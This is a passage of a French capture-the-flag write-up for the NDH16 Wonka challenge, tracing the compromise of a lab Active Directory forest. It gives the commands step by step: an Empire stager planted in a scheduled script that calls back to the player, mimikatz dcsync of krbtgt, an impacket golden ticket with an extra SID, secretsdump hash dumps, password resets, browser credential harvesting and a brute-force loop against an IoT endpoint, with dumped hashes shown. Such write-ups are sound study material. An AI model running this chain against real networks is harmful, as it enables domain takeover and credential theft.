Il était aussi possible d'utiliser meterpreter ou un script récupérant le krbtgt et le mettre dans un shares (mais c'est peu discret par rapport aux autres joueurs).

Créons, un listener et un stager sur Empire.

```
(Empire: listeners) > usestager windows/launcher_bat
(Empire: usestager windows/launcher_bat) > usestager windows/launcher_bat
(Empire: usestager windows/launcher_bat) > set listener <votre_listener>
(Empire: usestager windows/launcher_bat) > generate
```

Modifier le fichier ckdrive récupéré avec launcher.bat et uploader le fichier sur le serveur (avec smbclient: `put ckdrive.bat`)
Attendons 5 min et que l'agent se connecte à notre serveur.

```
(Empire: agents) > interact L4GNAHWC
(Empire: L4GNAHWC) > whoami
[*] Tasked L4GNAHWC to run TASK_SHELL
[*] Agent L4GNAHWC tasked with task ID 1
(Empire: L4GNAHWC) > [*] Agent L4GNAHWC returned results.
NT AUTHORITY\SYSTEM
[*] Valid results returned by 151.80.230.58
```

Bingo, on est bon, continuons de jouer avec Empire (commande: `ìnfo` pour avoir des détails sur un module).  
Nous allons utiliser principalement le module dcsync de mimikatz.

```
(Empire: L4GNAHWC) > mimikatz
[*] Tasked L4GNAHWC to run TASK_CMD_JOB
[*] Agent L4GNAHWC tasked with task ID 2
[*] Tasked agent L4GNAHWC to run module powershell/credentials/mimikatz/logonpasswords
(Empire: L4GNAHWC) > [*] Agent L4GNAHWC returned results.
Job started: KD4AUC
[*] Valid results returned by 151.80.230.58
[*] Agent L4GNAHWC returned results.
Hostname: ad.dev.pramacorp.fr / authority\system-authority\system

  .#####.   mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 28016 (00000000:00006d70)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 20/06/2018 19:24:54
..........

(Empire: L4GNAHWC) >             
(Empire: L4GNAHWC) > usemodule credentials/mimikatz/dcsync     
(Empire: powershell/credentials/mimikatz/dcsync) > set user krbtgt
(Empire: powershell/credentials/mimikatz/dcsync) > execute
[*] Tasked L4GNAHWC to run TASK_CMD_JOB
[*] Agent L4GNAHWC tasked with task ID 3
[*] Tasked agent L4GNAHWC to run module powershell/credentials/mimikatz/dcsync
(Empire: powershell/credentials/mimikatz/dcsync) > [*] Agent L4GNAHWC returned results.
Job started: K3MT2W
[*] Valid results returned by 151.80.230.58
[*] Agent L4GNAHWC returned results.
Hostname: ad.dev.pramacorp.fr / authority\system-authority\system

  .#####.   mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:krbtgt
[DC] 'dev.pramacorp.fr' will be the domain
[DC] 'ad.dev.pramacorp.fr' will be the DC server
[DC] 'krbtgt' will be the user account
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE
[*] Valid results returned by 151.80.230.58
```

Essayons dcsync en ciblant le domaine dev et l'utilisateur krbtgt.

```
(Empire: powershell/credentials/mimikatz/dcsync) > set user dev\krbtgt
(Empire: powershell/credentials/mimikatz/dcsync) > execute
[*] Tasked L4GNAHWC to run TASK_CMD_JOB
[*] Agent L4GNAHWC tasked with task ID 4
[*] Tasked agent L4GNAHWC to run module powershell/credentials/mimikatz/dcsync
(Empire: powershell/credentials/mimikatz/dcsync) > [*] Agent L4GNAHWC returned results.
Job started: 6LMYF5
[*] Valid results returned by 151.80.230.58
[*] Agent L4GNAHWC returned results.
Hostname: ad.dev.pramacorp.fr / authority\system-authority\system

  .#####.   mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dev\krbtgt
[DC] 'dev.pramacorp.fr' will be the domain
[DC] 'ad.dev.pramacorp.fr' will be the DC server
[DC] 'dev\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 08/04/2018 21:01:21
Object Security ID   : S-1-5-21-354401377-2576014548-1758765946-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: e65b41757ea496c2c60e82c05ba8b373
    ntlm- 0: e65b41757ea496c2c60e82c05ba8b373
    lm  - 0: 607ef830352d343c66db8ea5fa2f635f

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.PRAMACORP.FRkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : cec28c65d0480e15a8e926a39ea9e24bec6bab39e7ee4e40ea1c1d74d6b9fb9b
      aes128_hmac       (4096) : e125709e6b6dcbfea19c62d5af0cbe34
      des_cbc_md5       (4096) : 1910e08f5e850216

* Primary:Kerberos *
    Default Salt : DEV.PRAMACORP.FRkrbtgt
    Credentials
      des_cbc_md5       : 1910e08f5e850216

* Packages *
    Kerberos-Newer-Keys

* Primary:WDigest *
    01  99104105fd29d2d39be6380961f83e8c
    02  d8191f09d8caa79c4d0d948f37ba7d8e
    03  9dcbde9b5f29b5fa74f7484d07c65b80
    04  99104105fd29d2d39be6380961f83e8c
    05  d8191f09d8caa79c4d0d948f37ba7d8e
    06  80dbdb66844c2023c39263d2f0ae44bf
    07  99104105fd29d2d39be6380961f83e8c
    08  26736a367f2ff1533e626516fc7fd5db
    09  26736a367f2ff1533e626516fc7fd5db
    10  3018d9ff1d188c99efc8c33edf8c5fe2
    11  01564b0803470902c264440d774a7f0f
    12  26736a367f2ff1533e626516fc7fd5db
    13  64d5e3b267c119a93ee62677830a9c12
    14  01564b0803470902c264440d774a7f0f
    15  c0636b8c02e6544351917618a9a348bd
    16  c0636b8c02e6544351917618a9a348bd
    17  3468095daaed0b0e41b0a3daf096951a
    18  dceace8ff0b56b4f98d860cb8bcaa497
    19  da48ba62c7faf654a9ffb3f416f402fa
    20  efec8ffb01bb7be472b6b46a78f753e9
    21  be3a539db323719e05ea0b891c83f54b
    22  be3a539db323719e05ea0b891c83f54b
    23  f8e2b3ad02ebd4505217d6139b6731ba
    24  2f1c1fbde49a69c5832504b858b5e0c3
    25  2f1c1fbde49a69c5832504b858b5e0c3
    26  0e1fb4fc1eff104789d7a61e4b8bb8c3
    27  d29bd9ed37da84c25afd82eafabc0d71
    28  9a1794854a48fe460a3ab7b1f016df9e
    29  ac2746c1ad97b278c3b3be71866d95a9



[*] Valid results returned by 151.80.230.58
 * Thread Token  : no token
```

Et voilà le flag de cette étape : e65b41757ea496c2c60e82c05ba8b373.  

## L'histoire d'un ticket (flag 5)

Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).

On a le krbtgt du sous-domaine ad.pramacorp.fr, son SID en gros tout ce qu'il faut pour créer un ticket d'or.  
Avec Windows, il existe le SID History qui permet à un utilisateur de changer de domaine en conservant les droits sur son ancien domaine.
Récupérons le SID du domaine parent avec l'agent déployé sur l'ad.dev.pramacorp.fr.

```
(Empire: L4GNAHWC) > shell powershell "get-addomain pramacorp.fr"
[*] Tasked L4GNAHWC to run TASK_SHELL
[*] Agent L4GNAHWC tasked with task ID 6
(Empire: L4GNAHWC) > [*] Agent L4GNAHWC returned results.
AllowedDNSSuffixes                 : {}
ChildDomains                       : {dev.pramacorp.fr}
ComputersContainer                 : CN=Computers,DC=pramacorp,DC=fr
DeletedObjectsContainer            : CN=Deleted Objects,DC=pramacorp,DC=fr
DistinguishedName                  : DC=pramacorp,DC=fr
DNSRoot                            : pramacorp.fr
DomainControllersContainer         : OU=Domain Controllers,DC=pramacorp,DC=fr
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-2992845451-2057077057-2526624608
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=pramacorp,
                                     DC=fr
Forest                             : pramacorp.fr
InfrastructureMaster               : ad.pramacorp.fr
LastLogonReplicationInterval       : 
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9}
                                     ,CN=Policies,CN=System,DC=pramacorp,DC=fr}
LostAndFoundContainer              : CN=LostAndFound,DC=pramacorp,DC=fr
ManagedBy                          : 
Name                               : pramacorp
NetBIOSName                        : CORP
ObjectClass                        : domainDNS
ObjectGUID                         : 66fd4539-4b74-4e19-b5a7-1828b92ea6e3
ParentDomain                       : 
PDCEmulator                        : ad.pramacorp.fr
QuotasContainer                    : CN=NTDS Quotas,DC=pramacorp,DC=fr
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ad.pramacorp.fr}
RIDMaster                          : ad.pramacorp.fr
SubordinateReferences              : {DC=dev,DC=pramacorp,DC=fr, 
                                     DC=ForestDnsZones,DC=pramacorp,DC=fr, 
                                     DC=DomainDnsZones,DC=pramacorp,DC=fr, 
                                     CN=Configuration,DC=pramacorp,DC=fr}
SystemsContainer                   : CN=System,DC=pramacorp,DC=fr
UsersContainer                     : CN=Users,DC=pramacorp,DC=fr

..Command execution completed.
```

Utilisons le sid du domaine pramacorp.fr pour notre utilisateur krbtgt du sous-domaine. Mais avant tout il nous faut un groupe d'utilisateur à ajouter au SID.
Pour tout les détails sur les SID, je vous conseil le [support de Microsoft](https://support.microsoft.com/fr-fr/help/243330/well-known-security-identifiers-in-windows-operating-systems).
Nous allons utiliser le SID suivant de cette forme : `S-1-5-21domain racine-519`

On a plus qu'à créer le golden ticket avec le sid du domaine root :
```
impacket/examples/ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV.PRAMACORP.FR Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
```

Une fois le ticket entre nos mains, il ne reste plus qu'à le jouer sur le domaine pour récupérer le flag5.
On peut uploader un mimikatz sur le serveur cible et récupérer l'identifiant avec le module lsadump::dcsync.

Et voilà le flag de cette étape : 5a3a5e76a7f4ef645fc82118ab87b56c.

## Heureseument que les navigateurs sont là pour nous faciliter la vie (flag 6)

Nous avonc compromis le domaine pramacorp.fr. Pour la suite de l'épreuve, nous devons allumer un écran (flag 7) mais avant tout récupérons un accès à la machine du développeur pour avoir un accès à une application qui nous donnera accès à l'écran.

### Un peu d'inventaire

Une fois Administrateur de domaine, on doit récupérer un mot de passe sur l'ordinateur de l'admin.  
Ce mot de passe concerne un site web à l'adresse suivante `http://pramafil.com:10080/MqIrT1g6h7PoKl0Aq1/index.php`.
En utilisant l'agent Empire du flag4, on va scanner le réseau pour savoir ce qu'il y a de disponible.

```
(Empire: L4GNAHWC) > usemodule situational_awareness/network/arpscan
(Empire: powershell/situational_awareness/network/arpscan) > set CIDR 10.10.0.0/24
(Empire: powershell/situational_awareness/network/arpscan) > run
[*] Tasked L4GNAHWC to run TASK_CMD_JOB
[*] Agent L4GNAHWC tasked with task ID 1
[*] Tasked agent L4GNAHWC to run module powershell/situational_awareness/network/arpscan
(Empire: powershell/situational_awareness/network/arpscan) > [*] Agent L4GNAHWC returned results.
Job started: LWD1TU
[*] Valid results returned by 151.80.230.58
[*] Agent PZEU81KX returned results.

MAC               Address    
---               -------    
AE:97:1C:BB:BB:41 10.10.0.201
CE:DD:4F:EE:13:B9 10.10.0.202
0E:BA:E6:EC:20:E4 10.10.0.203
42:2A:CD:80:CD:3A 10.10.0.204
AA:70:CE:D0:D0:BA 10.10.0.205
0A:10:DA:DA:53:56 10.10.0.206
7A:98:23:69:CB:4B 10.10.0.207
9E:68:ED:FB:FE:8C 10.10.0.254 
```

On va ensuite effectuer un scan de port sur ces machines :

```
(Empire: L4GNAHWC) > usemodule situational_awareness/network/portscan
(Empire: powershell/situational_awareness/network/portscan) > set Hosts 10.10.0.200,10.10.0.201,10.10.0.203,10.10.0.204,10.10.0.205,10.10.0.206,10.10.0.207,10.10.0.202
(Empire: powershell/situational_awareness/network/portscan) > execute
[*] Tasked L4GNAHWC to run TASK_CMD_JOB
[*] Agent L4GNAHWC tasked with task ID 2
[*] Tasked agent L4GNAHWC to run module powershell/situational_awareness/network/portscan
(Empire: powershell/situational_awareness/network/portscan) > [*] Agent L4GNAHWC returned results.
Job started: WEC7AV
[*] Valid results returned by 151.80.230.58
[*] Agent L4GNAHWC returned results.

Hostname                                                     OpenPorts                                                  
--------                                                     ---------                                                  
10.10.0.201                                                  80,22                                                      
10.10.0.203                                                  3389,445,139,135,49152,49154,49153,88                      
10.10.0.204                                                  445,139,53,135,49154,88                                    
10.10.0.205                                                  3389,445,139,135                                           
10.10.0.207                                                  80,22                                                      
10.10.0.202                                                  445,139,53,135,49154,88
```

On va ensuite lister les utilisateurs du domaine pramacorp.fr.

```
proxychains impacket/examples/secretsdump.py -use-vss Administrator@ad.dev.pramacorp.fr -k -no-pass
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.203:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.203:88-<><>-OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc9756f5e599c005771b32c39356b49d0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c5936d4c8385fae00c5e98c072d8ffb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:ccd758b0dfee8ee38a9306748c7c0800:::
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DEV\AD$:aad3b435b51404eeaad3b435b51404ee:7aa70ed2b353ced9fc7535756aff1dd0:::
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
 0000   01 00 00 00 01 5C 4B CA  95 F3 32 D0 26 46 B6 F3   .....\K...2.&F..
 0010   D9 CB F9 59 CD FD 07 1C  B2 8F BF 8E 0D 55 2C C7   ...Y.........U,.
 0020   BB 34 B6 2E F2 83 53 C7  35 09 23 91               .4....S.5.#.
DPAPI_SYSTEM:01000000015c4bca95f332d02646b6f3d9cbf959cdfd071cb28fbf8e0d552cc7bb34b62ef28353c735092391
[*] NL$KM 
 0000   79 BA 2F 22 52 20 B5 96  E7 F8 FF 92 69 C0 9B 60   y./"R ......i..`
 0010   68 E8 98 2F 31 E3 DF 52  35 8F 00 8E 39 1F 2D 33   h../1..R5...9.-3
 0020   75 42 3C E5 53 39 B1 4B  06 4E 55 99 00 16 67 7C   uB<.S9.K.NU...g|
 0030   5D 31 A6 B8 C3 5C 7C 6C  FE 59 FF AB 5B 2E 9F 05   ]1...\|l.Y..[...
NL$KM:79ba2f225220b596e7f8ff9269c09b6068e8982f31e3df52358f008e391f2d3375423ce55339b14b064e55990016677c5d31a6b8c35c7c6cfe59ffab5b2e9f05
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f5af1c6e1943f16eb81d04968f365d24
[*] Reading and decrypting hashes from \\ad.dev.pramacorp.fr\ADMIN$\Temp\UCLxymdg.tmp 
AD$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5df5230c6fb4950cead63fe951090177:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
AD$:1001:aad3b435b51404eeaad3b435b51404ee:7aa70ed2b353ced9fc7535756aff1dd0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e65b41757ea496c2c60e82c05ba8b373:::
CORP$:1102:aad3b435b51404eeaad3b435b51404ee:eb7be87ea606706ec98d2ba2f109c5ad:::
DEVDESK01$:1103:aad3b435b51404eeaad3b435b51404ee:4595b8f20f138e39e30861cb0811d853:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DEV$:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Bremand:2544:aad3b435b51404eeaad3b435b51404ee:780d0496bc0f9be5370bdb3ba0733ce4:::
Anderem:2545:aad3b435b51404eeaad3b435b51404ee:152d215a71c0897aab0b37b02b8f9d5c:::
```


On a alors toutes les informations nécessaires pour la suite.

### L'art du déguisement

En dumpant les hashs avec secretsdumps on remarque l'utilisateur ADMDESK01$ 

```
ADMDESK01$:4228:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

On tente alors un ping sur le host admdesk01.pramacorp.fr à l'aide d'un psexec sur l'AD.

```
C:\Windows\system32>ping admdesk01.pramacorp.fr

Pinging admdesk01.pramacorp.fr [10.10.0.205] with 32 bytes of data:
Reply from 10.10.0.205: bytes=32 time<1ms TTL=128
Reply from 10.10.0.205: bytes=32 time<1ms TTL=128
Reply from 10.10.0.205: bytes=32 time<1ms TTL=128
Reply from 10.10.0.205: bytes=32 time<1ms TTL=128

Ping statistics for 10.10.0.205:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

On s'y connecte et on regarde les utilisateurs.

```
proxychains impacket/examples/smbclient.py Administrator@admdesk01.pramacorp.fr -k -no-pass
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.205:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.203:88-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.0.204:88-<><>-OK
Type help for list of commands
# shares
ADMIN$
C$
IPC$
# use c$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# exit
```

Le ticket kerberos ne fonctionne pas. On va alors tenter de s'identifier avec un couple login/mot de passe en changeant le mot de passe Administrateur sur l'AD pramacorp.fr.

```
powershell "Set-ADAccountPassword -Identity Administrator -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'monmdpsecurisedelamort' -Force)"
```

Et ensuite, listons les utilisateurs de la workstation.

```
proxychains impacket/examples/smbclient.py Administrator@admdesk01.pramacorp.fr 
# shares
ADMIN$
C$
IPC$
# use c$
# ls
drw-rw-rw-          0  Wed Jun 20 15:55:53 2018 $Recycle.Bin
drw-rw-rw-          0  Fri Mar 23 16:50:26 2018 Documents and Settings
-rw-rw-rw- 1717772288  Wed Jun 20 19:27:52 2018 hiberfil.sys
-rw-rw-rw-  738197504  Wed Jun 20 19:27:53 2018 pagefile.sys
drw-rw-rw-          0  Fri Mar 23 16:41:03 2018 PerfLogs
drw-rw-rw-          0  Tue Jun 26 11:15:52 2018 Program Files
drw-rw-rw-          0  Tue Jun 26 11:15:54 2018 Program Files (x86)
drw-rw-rw-          0  Tue Jun 26 11:35:40 2018 ProgramData
drw-rw-rw-          0  Fri Mar 23 16:50:38 2018 Recovery
-rw-rw-rw-  268435456  Wed Jun 20 19:27:53 2018 swapfile.sys
drw-rw-rw-          0  Fri Mar 23 17:00:33 2018 System Volume Information
drw-rw-rw-          0  Wed Jun 20 15:55:39 2018 Users
drw-rw-rw-          0  Wed Jun 20 17:21:59 2018 Windows
# cd Users
# ls
drw-rw-rw-          0  Wed Jun 20 15:55:39 2018 .
drw-rw-rw-          0  Wed Jun 20 15:55:39 2018 ..
drw-rw-rw-          0  Wed Jun 20 15:58:10 2018 akerva
drw-rw-rw-          0  Fri Mar 23 16:41:59 2018 All Users
drw-rw-rw-          0  Fri Mar 23 16:50:26 2018 Default
drw-rw-rw-          0  Fri Mar 23 16:41:59 2018 Default User
-rw-rw-rw-        174  Fri Mar 23 16:37:49 2018 desktop.ini
drw-rw-rw-          0  Fri Mar 23 16:55:27 2018 Public
drw-rw-rw-          0  Wed Jun 20 13:46:06 2018 SupportIT
drw-rw-rw-          0  Fri Jun  1 15:48:38 2018 Worecaus
# 
```

On remarque l'utilisateur Worecaus.  
On change son mot de passe.

```
powershell "Set-ADAccountPassword -Identity Worecaus -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'monmdpsecurisedelamort' -Force)"
```

Comme le port RDP est ouvert sur la machine (port 3389), utilisons la bonne vieille interface graphique que tout le monde adore 
J'ai utilisé Remina avec proxychains.

Quand on arrive sur le le bureau distant, un navigateur est ouvert sur la page du top10 OWASP 2017. On remarque aussi d'autres onglets comme le guide de l'ANSSI sur les mots de passe, un onglet pour le site de keepass, putty.

![onglets du navigateur](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/rdp.png)

On n'hésite pas à faire un petit tour dans ces fichers. Le dossier systéme hosts est en favoris donc on regarde de plus prés son contenu pour en comprendre plus sur l'architecture réseau même si cela ne nous servira pas beaucoup par la suite.

![dossiers](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/dossiers.png)  
![hosts](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/hosts.png)

On récupére un keepass dans le dossier des téléchargements. On lance un hydra, hascat, johntheripper avec un dictionnaire avec le nom de l'entreprise pramacorp et d'autres informations comme le nom d'utilisateurs, le tout combiné avec une liste des 1000 mots de passe les plus utilisés comme rockyou. Pendant ce temps, continuons de chercher d'autres informations.

On vient de faire le tour de ces dossiers. Il faut retourner sur firefox pour en apprendre un peu plus. On va aller regarder les mots de passe stockés dans celui-ci (si on ne voit pas le truc, le site de l'ANSSI déconseille de garder les mots de passe dans les navigateurs, ce peut nous mettre sur la voie). A partir de ce moment là c'est du clikodrome pour le suite de l'étape.

![firefox options](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/firefox_1.png)
![firefox gestionnaire de mot de passe](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/firefox_2.png)
![firefox flag](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag6/firefox_3.png)

Et hop, on a les identifiants pour le site cible (http://pramafil.com:10080/MqIrT1g6h7PoKl0Aq1/index.php). L'adresse fut donnée en hint durant l'épreuve. Pour la récupérer sans le hint, il fallait obligatoirement craquer le keepass dont le mot de passe était Pramacorp123456.

Et voilà le flag de cette étape : bhqhuKxRZcG.

## Ah la joie des objets connectés (flag 7)

Pour le dernier flag, il faut lire sur un écran éteint qui est affiché par la webcam sur le site dont on vient de récupérer un couple login/password.
Sur le site, il y a un document sur lequel on apprend que l'entreprise utilise des prises Chacon 433 MHz avec des ID allant de 0 à 5000; mais aussi un bouton pour allumer et un autre pour éteindre un ventilateur. Voici le corps de la requête qui est effectuée :

`"code=1001&submit=on"`

Il ne reste plus qu'à bruteforcer le code entre 0 et 5000 pour allumer l'écran.
J'ai choisi le powershell car je l'ai fait sur la workstation de l'admin. On aurait pu le faire partir de notre poste car le site est acccéssible depuis l'extérieur et utiliser des outils comme patator ou wfuzz.

```
$Headers = @{
    Authorization = "Basic YWRtaW5QUkFNQTpiaHFodUt4UlpjRw=="
}
0..5000 | % { echo $_; Invoke-WebRequest -UseBasicParsing http://pramafil.com:10080/MqIrT1g6h7PoKl0Aq1/index.php -Headers $Headers -Method POST -Body "code=$_&submit=on" }
```

En vrai, j'ai scindé en 8 la commande sur les ID pour aller plus vite. L'écran c'est allumé au bout de 10 minutes. Ce n'est pas vraiment discret mais l'objectif est ici d'avoir le flag. Merci à l'équipe d'akerva d'avoir éteint l'écran ;)

![flag final](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag7/flag_7.png)

Et le flag final est : #AkervaRecrute;-).  
Pfffiou fini, on peut maintenant aller dormir :D
